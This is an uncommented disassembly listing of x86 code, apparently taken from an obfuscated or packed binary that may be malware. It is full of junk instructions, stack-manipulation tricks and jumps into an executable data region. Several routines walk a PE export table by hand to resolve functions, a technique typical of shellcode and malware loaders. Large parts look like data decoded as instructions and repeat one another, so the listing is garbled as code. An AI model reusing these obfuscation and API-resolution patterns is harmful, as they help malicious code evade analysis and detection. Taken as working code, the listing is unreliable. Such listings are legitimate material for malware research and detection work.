or ch [ edi + ecx * 8 ]
das
jo rwxdata
xor eax 0x98268d02
ja rwxdata
pop ebp
add [ esi - 0x17 ] esi
inc edi
mov esi 0xfaa4b628
jmp 0x8122e84c
jmp sub_101d52df
popfd
mov ebx [ edx + 0x6d314503 ]
push ebp
imul ebx [ edx - 0x7b ] 0xfeed3299
dec edx
mov [ edx + 0x1a996bd ] 0x1f93eaea
sub ecx [ ebx - 0x52750909 ]
retn
sub_101cee1a
mov [ ebp - 0x8 ] 0x0
ror ecx 0x1f
sub ch bl
bsr ecx ebp
mov ecx [ edx + 0x18 ]
add esp 0x4
clc
cmc
pushfd
cmp ecx [ ebp - 0x8 ]
pushfd
lea esp [ esp + 0x8 ]
jbe rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
sbb di bx
shld di bx 0x5
sbb si 0x7d95
inc si
sub ecx 0x1
xor di 0xafff
sbb di cx
bsr si ax
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov [ ebp - 0x4 ] ecx
inc esi
xchg cx di
mov ecx [ ebp - 0x8 ]
bt di 0x1
clc
shl di cl
rcr si 0x4
add ecx [ ebp - 0x4 ]
rol si 0x3
bts esi ecx
adc di ax
shr ecx 0x1
shl si cl
mov edi [ ebx + ecx * 4 ]
lea esi [ ebp * 8 - 0x260f86e7 ]
add edi eax
lea esi [ ebp * 8 - 0x6b10bcf9 ]
jmp rwxdata
jmp sub_101d52df
sub_101cf242
cmp [ edi ] 0x23
lea esp [ esp + 0x10 ]
js rwxdata
pushfd
lea esp [ esp + 0x4 ]
jne rwxdata
pushfd
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
and ecx 0xe1443ac4
jmp rwxdata
clc
lea eax [ edi - 0x6cca2c69 ]
lea eax [ esp - 0x56b621f1 ]
sub edx edx
jmp rwxdata
sar ah 0x4
sub edx edx
shl al cl
mov eax edx
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
sar ax 0x1
rcl ax 0xe
movsx ax bl
mov eax edx
sbb al al
test bh ah
bt bp 0x3
shl al 0x3
add edi 0x1
shr al cl
inc al
sub al bl
push esi
mov al [ edi ]
pushad
clc
cmc
push 0x59f51f78
test al al
call j_sub_101d2247
mov ecx 0x104
mov [ esp + 0x4 ] 0xa10758d3
mov [ esp ] 0xb5
mov [ esp + 0x4 ] si
lea esp [ esp + 0x44 ]
jmp rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
clc
clc
stc
sub al 0x30
bt bx si
stc
jmp rwxdata
cmp si ax
clc
xor al al
jmp sub_101d03b0
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
sub_101cf481
stc
add esi 0x2
push edx
pushfd
mov [ esp ] 0x60
dec ecx
lea esp [ esp + 0xc ]
jo rwxdata
jbe rwxdata
pushfd
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
jmp rwxdata
jne rwxdata
and bx ax
add bh bh
mov bx [ esi ]
jg rwxdata
jmp rwxdata
lea esp [ esp + 0x20 ]
jne rwxdata
sub ch 0x4a
mov ecx [ ebp - 0x4 ]
pushad
mov [ esp + 0x4 ] 0x21
cmp [ ebp + 0x14 ] ecx
call sub_101d8ce3
mov dh dl
jmp sub_101bdeb6
jmp rwxdata
shr ebx 0xc
pushfd
stc
cmc
cmp ebx 0x1
call sub_101bb2f6
sbb eax 0x27784757
xchg [ edi - 0x40 ] bh
and esi edi
outsb
adc ah [ esi - 0x1b84c2f5 ]
and edi [ esi + edi * 4 - 0x29a29d40 ]
mov [ ebp - 0x7f ] ebx
call sub_101c58b9
or eax eax
call sub_101d1d5d
and eax 0x77873fe0
dec ebx
jae rwxdata
movzx cx dl
lea ecx [ ebp * 4 + 0x63163ce0 ]
and ecx edi
bt si di
mov ecx [ ebp - 0x4 ]
bt dx 0xa
pushfd
stc
call sub_101d7660
push esp
mov [ esi + 0x4 ] edx
0x558f7e01 0xcde9
jle rwxdata
push esp
shr ebx 0xc
cmc
cmp ebx 0x1
push edx
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
je rwxdata
clc
add edi eax
call sub_101d3d95
sbb [ 0x28f9ced7 ] esp
and [ ebx + edx - 0x74 ] ch
xor eax [ ebx + ebx + 0x3f ]
pop edi
mov al [ 0x4b7f209f ]
sar [ ebx ] cl
jecxz rwxdata
push 0x589f4958
sub ebp ebx
xchg ebx eax
mov eax 0x6f4c6cba
aas
inc eax
scasd [ edi ]
sbb [ esi - 0x9965698 ] dh
push ecx
sub al 0x72
lodsd [ gs : esi ]
add cl [ ebp + 0x2570ee59 ]
cmp ecx ecx
push esi
push ss
pop edi
js rwxdata
in al 0xfe
add [ ebx ] dh
sub al 0xd6
mov bl cl
je rwxdata
movsx bx dl
ror bh cl
mov bx [ esi ]
push 0x4712b91c
and ebx 0xfff
bt di 0x3
push 0xf783b537
pushfd
add [ ebx + edi ] ax
pushad
pushfd
mov [ esp ] 0xa9
lea esp [ esp + 0x30 ]
jmp sub_101d8368
clc
pushfd
mov [ esp ] 0x11
cmp ebx 0x2
push ebx
lea esp [ esp + 0x8 ]
je rwxdata
xchg edi ebx
pushad
push ecx
mov esi [ esp + 0x24 ]
movzx bx dl
jmp sub_101d83a2
das
sub [ edi + 0x20 ] dl
aas
das
jg rwxdata
0x49d53966 0x7aa5
cdq
cmpsb [ esi ] [ edi ]
and al 0xda
iretd
push ds
in al dx
mov [ ecx ] dh
dec ebp
aad 0xea
add al 0x3a
mov [ esi ] dh
insb
jb rwxdata
and bx si
bswap bx
jmp sub_101d6177
pushfd
push 0x6f477e48
pushfd
cmp ebx 0x3
pushfd
lea esp [ esp + 0x10 ]
je rwxdata
cmpsd [ esi ] [ edi ]
aaa
imul ebx edi 0xeab5c619
sub [ esi ] dh
fadd [ esi + 0x55 ]
sub bh [ edx - 0x249c3090 ]
js rwxdata
ror edx cl
mov al 0xa6
dec edx
imul esi [ esi + 0x64 ] 0x8a948c7b

movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
lea esp [ esp + 0x4 ]
jmp sub_101d8368
sbb ch bl
pop edi
add [ ebp - 0x13e13fd7 ] dl
sub bl bl
mov al [ 0x33d708ff ]

push es
cdq
xchg edx eax
rol [ ebp + ebx * 2 - 0x56 ] 0x1
jne rwxdata
mov al [ 0x5de45f71 ]
xor dh [ esi ]
sub [ ebp + 0xf202464 ] ecx
test edi edx
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
mov cl 0x8a
pop eax
cmpsb [ esi ] [ edi ]
out 0xa8 eax
salc
movsb [ edi ] [ esi ]
fisub [ eax - 0x7053a22 ]
inc esi
loopne rwxdata
adc ebx ebp
dec edx
daa
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
sub_101cf4a6
pushfd
mov [ esp ] ecx
pushfd
lea esp [ esp + 0x8 ]
call j_sub_101cb5d7
call sub_101d6693
test [ ebx + ecx * 4 ] esi
enter 0x6377 0x1c
jo rwxdata
aaa
into
jo rwxdata
fldl2t
ja rwxdata
jmp 0x509b408b
mov eax [ 0xffffffffcf4f926c ]
loope rwxdata
movsd [ edi ] [ esi ]
xor [ eax ] bl
mov edi 0x932fef1f
sub eax [ eax ]

shl [ edx + ebx ] 0x29
and al [ edi ]
dec edi
push cs
inc ecx
pop esi
inc eax
pop esi
nop
scasb [ edi ]
sbb dh ah
loopne rwxdata
pushfd
lea esp [ esp + 0x4 ]
jne rwxdata
mov al [ 0x5e717665 ]
out dx al
xchg [ eax ] ecx
in eax 0xb9
aaa
xchg esi eax
add [ ebx - 0x7703153c ] 0x4
jne rwxdata
xchg ebp eax
dec edx
and bx ax
add bh bh
mov bx [ esi ]
jg rwxdata
jmp rwxdata
cmpsb [ esi ] [ edi ]
sub [ ebx + ebx * 8 + 0x4b ] ecx
outsb
mov [ edi ] dh
mov [ ecx - 0x3 ] es
jge rwxdata
jmp rwxdata
shr ebx 0xc
pushfd
stc
cmc
cmp ebx 0x1
call sub_101bb2f6
sbb eax 0x27784757
xchg [ edi - 0x40 ] bh
and esi edi
outsb
adc ah [ esi - 0x1b84c2f5 ]
and edi [ esi + edi * 4 - 0x29a29d40 ]
mov [ ebp - 0x7f ] ebx
call sub_101c58b9
or eax eax
call sub_101d1d5d
and eax 0x77873fe0
dec ebx
jae rwxdata
call 0xffffffffb55b1640
sbb al [ eax + 0x3f ]
push eax
cmp [ esi ] esp
aaa
dec edx
mov [ eax + edi * 2 - 0x419a5fd7 ] ss
mov eax [ 0xde52db2 ]
sti
cmp ebx [ ecx + 0x6f963726 ]
pop edx
and [ esi + eax + 0x7a ] cl
popfd
adc [ esi - 0x51 ] ebp
or eax 0x651f2519
fst [ edx - 0x10 ]
adc esi [ edx ]
or al 0xdf
lds di [ ebx + edi * 2 ]
sahf
cdq
out 0x4f al
out dx eax
pop ebx
add al 0x15
stosd [ edi ]
jae rwxdata
push esp
shr ebx 0xc
cmc
cmp ebx 0x1
push edx
mov [ esp + 0x4 ] cl
lea esp [ esp + 0x8 ]
je rwxdata
clc
add edi eax
call sub_101d3d95
sbb [ 0x28f9ced7 ] esp
and [ ebx + edx - 0x74 ] ch
xor eax [ ebx + ebx + 0x3f ]
pop edi
mov al [ 0x4b7f209f ]
sar [ ebx ] cl
jecxz rwxdata
outsd
jmp rwxdata
movsx bx dl
ror bh cl
mov bx [ esi ]
push 0x4712b91c
and ebx 0xfff
bt di 0x3
push 0xf783b537
pushfd
add [ ebx + edi ] ax
pushad
pushfd
mov [ esp ] 0xa9
lea esp [ esp + 0x30 ]
jmp sub_101d8368
clc
pushfd
mov [ esp ] 0x11
cmp ebx 0x2
push ebx
lea esp [ esp + 0x8 ]
je rwxdata
xchg edi ebx
pushad
push ecx
mov esi [ esp + 0x24 ]
movzx bx dl
jmp sub_101d83a2
das
sub [ edi + 0x20 ] dl
aas
das
je rwxdata
and bx si
bswap bx
jmp sub_101d6177
pushfd
push 0x6f477e48
pushfd
cmp ebx 0x3
pushfd
lea esp [ esp + 0x10 ]
je rwxdata
sbb al 0x24
lahf
lea eax [ ebp - 0x4 ]
pushfd
call sub_1020b496
loopne rwxdata
pop esp
inc esi
movzx bx al
movzx bx dl
mov bx [ esi ]
cmc
call j_sub_101bf312
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
lea esp [ esp + 0x4 ]
jmp sub_101d8368
add al ah
std
loop rwxdata
setpo bl
mov si 0xdb94
bswap di
movsx si cl
pop edi
not si
pop esi
not bh
mov bh 0xde
pop ebx
call sub_101d4da9
pushfd
call sub_101be1d9
not si
pushfd
mov esi eax
not eax
mov [ esp ] ebx
sets ah
movzx ax bl
lea eax [ LocalFree@IAT ]
push ebx
mov [ esp ] rwxdata
pushfd
call sub_101c8c32
cmp al 0x8
aaa
mov esi [ ebx ]
and bh [ edx + 0x63 ]
cmpsb [ esi ] [ edi ]
add cl [ ecx ]
pushfd
lodsb [ esi ]
test [ ecx + 0xd ] 0x51
outsb
xor [ esi + 0x51 ] ebp
0xaacd3185 0xab5
xchg ebp eax
xor eax 0xeef549e9
shl edx 0x1
std
or dl ch
cdq
out 0x27 al
push ebx
dec ebx
pop esp
mov [ edx - 0x42 ] bl
mov esp 0xae7f7e0
sti
or al 0xa1
jl rwxdata
sar [ edx - 0x7a ] 0x1
add [ esi + 0x7b ] ah
push cs
xlat
sbb eax 0x42567a1c
sub al 0x72
push edi
[ eax + 0x1797bd75 ] esi
xor eax 0xca6a1f52
cmpsd [ esi ] [ edi ]
insd
mov edx 0x72397acf
call 0x4dc0e67f
lahf
jpe rwxdata
lea esi [ eax + 0x19526069 ]
mov ebx 0x5b4abb2c
stosd [ edi ]
shl esp cl
les esi [ 0x638c7253 ]
sub [ ebx + 0x1b ] ah
out 0x38 eax
lahf
lahf
scasb [ edi ]
sub_101cf752
add ch bl
add dx 0x2558
adc cx 0x8875
mov [ esp ] edi
push edi
movsx cx bl
call sub_101d3d2b
or [ eax + 0x17 ] ebp
stosd [ edi ]
adc eax [ edx - 0x4ab71224 ]
adc [ edx ] 0x36
mov eax [ 0xffffffff8815ca3d ]
jge rwxdata
daa
and eax 0x39660bfa
add al [ ebp - 0x47 ]
or [ ecx ] al
and eax 0x23fb305d
ja rwxdata
popfd
frstor [ ecx - 0x461926db ]
push ebp
leave
aad 0xc9
xchg ecx eax
or eax 0x1ec065a0
cmp [ esi - 0x33 ] eax
jb rwxdata
mov ah [ 0xc246c88 ]
push edi
push [ esp + 0x1c ]
retn 0x20
aad 0x97
or [ ecx - 0x463934e5 ] bl
fdivr [ edi + 0x20 ]
mov eax [ 0xffffffffd9df7321 ]
sti
rcl [ ecx - 0xd ] cl
pop esp
retn 0xd788
retn 0xf8d3
sub_101d03b0
pushfd
stc
push [ esp ]
[ edi ]
push esi
lea esp [ esp + 0xc ]
jl rwxdata
jmp sub_1020b2b6
push esp
lea esp [ esp + 0x4 ]
jne rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
movsx si cl
shl si 0x3
btc si cx
mov ecx edi
cmp dl 0x92
sub si 0xafaa
sub si si
sub ecx ebx
bt sp ax
mov esi esp
cmc
bt ax 0x2
pushad
stc
sub edi 0x4
pushad
clc
push [ edi ]
pop [ esp + 0x3c ]
test al 0x15
pushfd
stc
cmc
cmp edi ebx
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
pushfd
call sub_101be1d9
sub_101d098e
push 0xaf352d
pushad
mov [ esp + 0x20 ] 0xaef1ca94
mov [ esp ] 0x9d
mov [ esp + 0x8 ] ch
mov [ esp ] 0xecf4
mov [ esp + 0x1c ] 0xa42bd8e4
push edx
pushad
push 0xc8c41e39
lea esp [ esp + 0x44 ]
jmp rwxdata
call sub_1020f299
sub_101d12b7
pushad
not al
lodsb [ esi ]
jmp rwxdata
cmp bl dh
neg al
cmp bl 0x72
cmp bh 0xb9
add al 0x2b
stc
bt ax bx
call sub_101d5b22
bt dx di
bt bx si
test edi edi
push edi
mov [ esp ] si
push [ esp ]
jmp rwxdata
lea esp [ esp + 0x38 ]
je rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
call sub_1020c332
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_101d153d
add eax edi
push 0xc35d6f47
cmp eax edx
pushad
call sub_101d3819
jmp rwxdata
lea esp [ esp + 0xc ]
jne rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
not ch
mov ecx edi
bt sp 0x1
rcl si 0xc
call $+5
neg esi
sub ecx ebx
pop esi
sub esi 0xde882eae
inc si
mov esi esp
test ebp 0x4fdd4ede
cmc
sub edi 0x4
call sub_101e3f41
lea esp [ esp + 0x8 ]
ja rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
cmp ax 0x4037
stc
pushfd
or al al
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
stc
stc
add ah 0x20
jmp rwxdata
push 0xc5f88448
mov [ esp ] 0xed25
test sp 0x9ab3
bt di 0x4
or ah ah
jmp j_sub_101bc751
jmp rwxdata
bt sp bp
test dl 0x4f
or al al
pushfd
lea esp [ esp + 0x4 ]
je rwxdata
test cx dx
pushad
test bl 0x6
cmp al ah
mov [ esp + 0x1c ] bl
lea esp [ esp + 0x20 ]
jg rwxdata
jmp rwxdata
jmp rwxdata
jne rwxdata
pushad
pushad
cmp al ah
call sub_101cf47c
call sub_101d410a
push edi
xchg [ edi ] edx
xchg [ ebx - 0x5c ] ebx
sbb al 0x2
ror [ eax ] 0x1
push ds
dec ebx
std
inc [ eax ]
lodsd [ esi ]
pop eax
fisub [ ebx + 0x3c ]
retn
push edx
lea esp [ esp + 0x4 ]
jne rwxdata
pushad
call sub_1020a43d
push eax
push 0x56f38b65
jmp rwxdata
pushad
jmp rwxdata
inc esi
mov [ esp + 0x4 ] ch
inc edi
pushad
mov [ esp + 0x10 ] si
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp sub_101d8396
inc esi
push edx
mov [ esp ] 0x7421
inc edi
mov [ esp + 0xc ] bh
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp sub_101d8396
sub_101d1613
bt sp bx
stc
test eax eax
mov [ esp ] 0xf6e1feae
push 0x5106c80d
lea esp [ esp + 0x8 ]
bts dx 0x2
xor eax eax
jge rwxdata
rcl edx 0x10
bt bp sp
sbb edx 0x153c5d27
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
xchg edi eax
dec eax
inc edi
js rwxdata
outsd
scasd [ edi ]
inc ebp
jpe rwxdata
xchg [ edx ] bh
xor [ 0x46bfeeb0 ] ebp
push ebp
sub ah [ ebx ]
sti
test [ edi ] 0x5f
pop edi
cli
movsd [ edi ] fs : [ esi ]
sar [ edi - 0x40 ] 0x8
jo rwxdata
je rwxdata
mov esi [ eax + 0x3c ]
dec edx
test dh 0x17
shld dx cx cl
add esi eax
rol dl cl
cmp si dx
bsf dx si
mov edx [ esi + 0x78 ]
call sub_101d1d77
pop edx
xor bh 0x68
pop esi
mov al [ 0xffffffff8f3c14f4 ]
or edi [ 0xffffffffaf6fde41 ]
fisub [ edi ]
pop ebp
cmp al 0x15
pop eax
cmp al 0xeb
pop ds
aas
push eax
salc
shl [ esi ] 0x1
inc [ ebp - 0x17 ]
jne rwxdata
aam 0x6a
xor al 0x8e
adc [ edx ] esp
pop edx
or cl 0x76
mov bh 0xb9
into
sub [ esi ] dh
pop ecx
mov bl 0xd9
insb
and edi [ esi + 0x74ba1768 ]
0x821d3c01 0x66c3
je rwxdata
imul [ eax + 0xd ]
enter 0x5106 0x8d
and al 0x8
sbb [ ebx + 0x6c ] 0xffffffd0
xor dh cl
xor [ esi ] ecx
fild [ ebx ]
fisub [ ebx + ecx ]
lahf
mov edi 0x7e3d21d0
shr [ esi + 0x7f ] 0x1
add bh al
mov esi 0xdfc01100
loopne rwxdata
cmp al 0xa2
sub_101d1d2f
push 0x29e085ed
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
pushfd
pushfd
push 0x688afb78
lea esp [ esp + 0xc ]
call sub_101d32df
bt bx 0x8
stc
sub ecx ebx
pushfd
push 0xa48ed21b
mov [ esp ] ah
jmp rwxdata
bt esp esi
test sp 0x722b
pushfd
cmp bp dx
xor eax eax
push 0x9d5e66e2
mov [ esp + 0x4 ] 0x66
pushad
call sub_101d227e
lea esp [ esp + 0x8 ]
jne rwxdata
push eax
push esp
mov [ esp ] si
call sub_101c0187
xchg ebx eax
xchg ebx eax
sbb al 0x0
retn 0x115b
call sub_101d53bf
cmp [ edi ] 0x23
mov [ esp ] si
mov [ esp ] 0x44b96846
lea esp [ esp + 0x24 ]
jne rwxdata
and ecx 0xe1443ac4
jmp rwxdata
push 0x2ea66de
btr ax si
inc ah
shrd ax bp cl
sub edx edx
cmc
neg al
aam 0xc7
mov eax edx
ror al 0x3
add edi 0x1
push esp
add al 0x1b
mov al [ edi ]
mov [ esp ] di
call sub_101bb96c
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
sub_101d1d5d
lea esp [ esp + 0x8 ]
je rwxdata
push 0x85a0923c
sub eax eax
sub esp 0xfffffffc
pushfd
call sub_101d91e6
mov bh 0xb7
mov bl 0x2f
movsx bx cl
mov ebx eax
jmp rwxdata
lea eax [ ebp - 0x8 ]
pushfd
push [ esp ]
pushad
mov [ esp + 0x24 ] eax
movzx ax bl
pop eax
push [ ebp - 0x4 ]
pop [ esp + 0x1c ]
cwde
mov [ esp + 0x18 ] ebx
not ah
movzx eax al
setge ah
mov [ esp + 0x14 ] 0xb
jmp rwxdata
push [ esp + 0xc ]
lea eax [ rwxdata ]
jmp rwxdata
jmp rwxdata
pushfd
pushad
mov [ esp + 0x38 ] rwxdata
jmp rwxdata
push [ eax ]
pop [ esp + 0x34 ]
mov [ esp + 0x4 ] 0x9a6d0070
push [ esp ]
pushfd
push esp
push [ esp + 0x40 ]
retn 0x44
sub_101d1d77
jmp rwxdata
push [ esp ]
test edx edx
push 0x33f6edc4
pushfd
jmp rwxdata
lea esp [ esp + 0x10 ]
je rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
not cx
add edx eax
shr ch cl
inc cl
seto ch
inc ecx
mov ecx [ esi + 0x7c ]
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
pushad
sub esp 0xffffffe0
jbe rwxdata
pushfd
add ecx edx
mov [ esp ] dl
mov [ ebp - 0x10 ] ecx
rcr cl cl
xor cx di
mov ecx [ ebp + 0xc ]
pushad
push eax
cmp ecx 0xffff
jmp rwxdata
pushad
add ecx edx
pushfd
bt bx 0xc
mov [ ebp - 0x10 ] ecx
xor ecx eax
pushad
or ch bh
mov ecx [ ebp + 0xc ]
stc
cmc
cmp ecx 0xffff
mov [ esp ] bx
lea esp [ esp + 0x44 ]
jbe rwxdata
lea esp [ esp + 0x28 ]
jbe rwxdata
call sub_101bde94
push cs
imul [ eax ]
mov dl 0xcd
lodsd [ esi ]
shl edx 0x1
sahf
je rwxdata
bts bx bp
sub ecx eax
shr di 0x3
mov edi [ edx + 0x24 ]
not ch
movzx bx al
stc
btr ecx 0x13
add edi eax
bts bx 0xe
btr bx si
bsf bx sp
test bh 0x64
mov ebx [ edx + 0x20 ]
sbb ch 0xe7
add ebx eax
call sub_101cee1a
dec esi
inc ebp
push esp
inc ecx
push eax
dec ecx
xor esi [ edx ]
insb
insb
add [ ebp - 0x70af4818 ] ch
jmp rwxdata
bsf di bp
pushad
inc ch
mov edi [ edx + 0x24 ]
sar bx cl
add edi eax
inc cl
or ch 0x38
shl bl 0x6
mov ebx [ edx + 0x20 ]
shrd cx bx 0x6
bsr cx di
add ebx eax
shl ch 0x1
inc ch
xor ch 0x29
cmp cl 0x61
mov [ ebp - 0x8 ] 0x0
movsx cx al
rol ch cl
mov ecx [ edx + 0x18 ]
stc
stc
stc
cmp ecx [ ebp - 0x8 ]
pushad
lea esp [ esp + 0x40 ]
jbe rwxdata
and al 0x3b
sbb eax [ ebx - 0x52 ]
push edi
test al 0x97
ja rwxdata
sbb eax 0x1b3b242b
inc ebx
scasb [ edi ]
or al 0x89
dec ebp
xor di 0xb267
sub ecx 0x1
rcr si 0xe
adc di 0xc5b8
adc esi esp
btr si dx
mov [ ebp - 0x4 ] ecx
shl esi cl
clc
mov ecx [ ebp - 0x8 ]
shld esi edx 0x10
shld di bx 0x1
add ecx [ ebp - 0x4 ]
stc
adc di 0x6a5d
clc
xor di 0x8f9a
shr ecx 0x1
movzx si bl
btr di 0x7
shl di cl
mov edi [ ebx + ecx * 4 ]
push ebp
neg si
movsx si bl
add edi eax
pushad
jmp rwxdata
jg rwxdata
push edi
dec eax
fwait
mov esi [ ebp + 0xc ]
call sub_101d6a53
mov al [ edi ]
test eax 0x8a3ed1e3
test al al
pushfd
push 0x2d98198a
mov [ esp ] ah
pushfd
lea esp [ esp + 0xc ]
je rwxdata
push ebp

xor cl [ 0x39a53576 ]
push es
js rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
cmc
cmc
sub al 0x30
push ebp
mov [ esp ] 0xf5ab
mov [ esp ] 0xa3
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
inc ebx
arpl [ esp + eax ] di
add eax esi
adc eax 0x425a06f8
je rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
bt bx si
stc
jmp rwxdata
loop rwxdata
0x777a0467 0x638e
cmp al 0x9
pushfd
call sub_101c99ba
shr al 0x3
ror al 0x2
rcr ah cl
mov eax [ ebp - 0x8 ]
test ch 0x99
test esi eax
cmp ah 0x5
cmc
shl eax 0x1
call sub_101bdee6
pushfd
lea edi [ ebx - 0x47c248e ]
movzx esi [ edx + 0x1a ]
pushfd
bswap di
lea esi [ esi + edx + 0x1c ]
jmp rwxdata
and al 0x92
insb
fwait
inc esp
sub eax 0x7af1ae11
and eax 0x815e69b6
salc
fcmovb st4
aad 0xff
mov [ eax - 0x54ec78e6 ] cl
test [ ebx + 0x1e1e282 ] bl
sub ecx [ ebx ]
cld
and esi [ edx + ebp * 2 ]
push esp
push 0x70aa5549
outsd
cmp cl 0xfd
retn 0xf140
add [ ebx ] ebp
or edi esp
pushad
mov edi [ ebp + 0x8 ]
pushfd
call sub_101d96a1
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
add edx eax
push 0x642b6212
push 0x3ff1ecec
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x8 ]
jmp rwxdata
mov al al
adc al bh
add edi 0x1
rcr al 0x1
push 0xae313a6d
inc al
add al 0x97
mov al [ edi ]
test bh ah
test al al
push 0x8f16e632
lea esp [ esp + 0x8 ]
je rwxdata
clc
clc
stc
sub al 0x30
sub_101d2247
pushfd
mov [ esp + 0x4 ] 0x80
lea esp [ esp + 0x30 ]
je rwxdata
rcr al 0x6
shld ecx ebp cl
mov edi edx
and ecx 0xe1443ac4
jmp rwxdata
stc
bt sp ax
cmc
sub al 0x30
jpo rwxdata
mov ecx edi
test cl 0x74
add al 0xdb
mov al [ ecx ]
push 0x995b44fd
call sub_101d77ba
imul dh
xor [ esi ] bh
xor [ esi - 0x2a795038 ] 0xa0
cmp [ edi ] ecx
and ebx [ ebx - 0x42d6e984 ]
and [ ecx + edi * 2 - 0x7a656ab6 ] ecx
inc ecx
mov ebp 0xf965ad72
adc eax 0x15f92609
or esp edi
inc edx
push ebx
lea edx [ ecx - 0x18115000 ]
0x8c732e26 0xa392
push 0xe5bfe2b4
cmp al 0x9
pushad
lea esp [ esp + 0x24 ]
ja rwxdata
stc
cmc
cmp ebx 0xe9e3bf8d
cmp al 0x9
jmp rwxdata
pushad
mov [ esp ] 0x8
mov [ esp + 0x4 ] 0x7e
push edi
mov esp esi
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
stc
imul edx edx 0xa
jmp rwxdata
jmp rwxdata
bts dx 0x2
xor eax eax
